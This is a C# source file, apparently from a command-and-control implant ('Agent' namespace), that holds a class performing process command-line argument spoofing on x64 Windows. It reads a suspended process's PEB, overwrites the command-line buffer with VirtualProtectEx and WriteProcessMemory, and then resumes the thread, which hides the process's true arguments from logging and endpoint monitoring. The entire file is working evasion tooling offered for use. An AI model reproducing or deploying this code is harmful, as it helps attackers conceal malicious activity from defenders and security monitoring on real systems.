using System;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

using static Agent.PInvoke.NativeMethods;

namespace Agent.Utilities
{
    public class TinkerTailor
    {
        PROCESS_INFORMATION pi;
        string RealArgs;

        public TinkerTailor(PROCESS_INFORMATION pi, string RealArgs)
        {
            this.pi = pi;
            this.RealArgs = RealArgs;
        }

        public void SpoofArgs()
        {
            var pbi = GetPBI();

            // x64 only
            var rtlUserProcessParameters = 0x20;
            var commandLine = 0x70;
            var readSize = 0x8;

            Thread.Sleep(500);

            var pProcessParams = ReadRemoteMemory(pbi.PebBaseAddress + rtlUserProcessParameters, readSize);
            var processParams = Marshal.ReadInt64(pProcessParams);
            var cmdLineUnicodeStruct = new IntPtr(processParams + commandLine);

            var currentCmdLineStruct = new UNICODE_STRING();
            var uniStructSize = Marshal.SizeOf(currentCmdLineStruct);

            var pCmdLineStruct = ReadRemoteMemory(cmdLineUnicodeStruct, uniStructSize);
            currentCmdLineStruct = (UNICODE_STRING)Marshal.PtrToStructure(pCmdLineStruct, typeof(UNICODE_STRING));

            WriteRemoteMemory(currentCmdLineStruct.Buffer, currentCmdLineStruct.Length);

            Thread.Sleep(500);

            Kernel32.ResumeThread(pi.hThread);
        }

        PROCESS_BASIC_INFORMATION GetPBI()
        {
            var pbi = new PROCESS_BASIC_INFORMATION();
            int pbiSize = Marshal.SizeOf(pbi);
            Ntdll.NtQueryInformationProcess(pi.hProcess, 0, ref pbi, pbiSize, out uint _);
            return pbi;
        }

        IntPtr ReadRemoteMemory(IntPtr pMem, int size)
        {
            // Alloc & null buffer
            var pMemLoc = Marshal.AllocHGlobal(size);
            Kernel32.RtlZeroMemory(pMemLoc, size);

            // Read
            Kernel32.ReadProcessMemory(pi.hProcess, pMem, pMemLoc, (uint)size, out uint _);

            return pMemLoc;
        }

        public void WriteRemoteMemory(IntPtr pDest, int size)
        {
            // Make writable
            Kernel32.VirtualProtectEx(pi.hProcess, pDest, (uint)size, AllocationProtect.PAGE_READWRITE, out AllocationProtect old);

            var pMem = Marshal.AllocHGlobal(size);

            // Erase current buffer
            Kernel32.RtlZeroMemory(pMem, size);
            Kernel32.WriteProcessMemory(pi.hProcess, pDest, pMem, (uint)size, out uint _);

            // Write new args
            if (!string.IsNullOrEmpty(RealArgs))
            {
                var newArgs = Encoding.Unicode.GetBytes(RealArgs);
                Marshal.Copy(newArgs, 0, pMem, newArgs.Length);
                Kernel32.WriteProcessMemory(pi.hProcess, pDest, pMem, (uint)size, out uint _);
            }

            // Restore memory perms
            Kernel32.VirtualProtectEx(pi.hProcess, pDest, (uint)size, old, out AllocationProtect _);
        }
    }
}